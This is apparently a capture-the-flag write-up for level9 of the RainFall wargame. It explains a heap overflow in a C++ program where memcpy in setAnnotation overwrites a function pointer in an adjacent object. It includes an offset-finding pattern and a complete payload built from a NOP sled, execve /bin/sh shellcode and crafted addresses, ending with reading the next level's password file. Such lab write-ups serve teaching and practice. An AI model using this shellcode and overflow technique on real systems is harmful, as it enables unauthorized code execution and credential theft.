### Brief
This is a c++ program that contains a `main` function and a `N` class
`main` allocate two `N` instance.
It also uses the `setAnnotation` method of the first instance.

### Exploit
`setAnnotation` function fill the annotation buffer of size 100 using `memcpy` and is called with the first argument.
We can overflow the `annotation` buffer of the first instance so that it overwrite the `function` called by the second instance.

We use the pattern generator the get the offset needed to overwrite the function called.

```bash
level9@RainFall:~$ ./level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
level9@RainFall:~$ dmesg
...
[15404.995709] level9[13068]: segfault at 80cd0bb0 ip 80cd0bb0 sp bffff6bc error 14
```
The offset is 108.

Since the function attribute is a pointer containing a function we need to put the address of a byte of the payload and the address of the shellcode in this byte.

### Get access
We craft a payload containing 83 `NOP` instruction, the shellcode of size 21, the address of the shellcode, the address of the previous byte.

```bash
./level9 $(python -c "print('\x90'*83 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08' + '\x74\xa0\x04\x08')")
$ cat /home/user/bonus0/.pass
```
